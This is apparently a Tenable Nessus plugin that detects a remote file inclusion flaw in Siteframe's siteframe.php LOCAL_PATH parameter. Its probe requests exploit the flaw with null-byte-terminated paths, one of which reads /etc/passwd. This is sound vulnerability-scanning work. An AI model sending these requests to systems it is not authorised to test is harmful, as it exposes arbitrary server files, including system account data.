#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(18460);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2005-1965");
  script_bugtraq_id(13928);
  script_osvdb_id(17246);

  script_name(english:"Siteframe siteframe.php LOCAL_PATH Parameter Remote File Inclusion");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a remote
file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Siteframe, an open source content
management system using PHP and MySQL. 

The installed version of Siteframe does not properly sanitize the
'LOCAL_PATH' parameter of the 'siteframe.php' script before using it
to include files.  By leveraging this flaw, an attacker is able to
view arbitrary files on the remote host and even execute arbitrary PHP
code, possibly taken from third-party hosts." );
  # http://web.archive.org/web/20061017041521/http://securitytracker.com/alerts/2005/Jun/1014150.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?034b19ae" );
  # http://web.archive.org/web/20070908174320/http://v3.siteframe.org/document.php?id=483
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?80d659bd" );
 script_set_attribute(attribute:"solution", value:
"Patch 'siteframe.php' as suggested in the project document referenced
above." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(94);
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/06/10");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/06/10");
 script_cvs_date("$Date: 2013/01/07 22:57:22 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:glen_campbell:siteframe");
script_end_attributes();

 
  script_summary(english:"Checks for LOCAL_PATH remote file include vulnerability in Siteframe");
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2013 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# For each CGI directory...
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw to read a file included in the distribution.
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/siteframe.php?",
      "LOCAL_PATH=macros/100-siteframe.macro%00"
    ),
    port:port
  );
  if (isnull(w)) exit(1, "The web server did not answer");
  res = w[2];

  # There's a problem if it looks like the file.
  if ("{!# Siteframe Macro Library" >< res) {
    security_hole(port);
    exit(0);
  }

 if ( thorough_tests )
  {
  # If that failed, try to grab /etc/passwd.
  w = http_send_recv3(method:"GET", 
    item:string(
      dir, "/siteframe.php?",
      "LOCAL_PATH=/etc/passwd%00"
    ),
    port:port
  );
  if (isnull(w)) exit(1, "The web server did not answer");
  res = w[2];

  # There's a problem if there's an entry for root.
  if (egrep(string:res, pattern:"root:.+:0:")) {
    security_hole(port);
    exit(0);
  }
 }
}
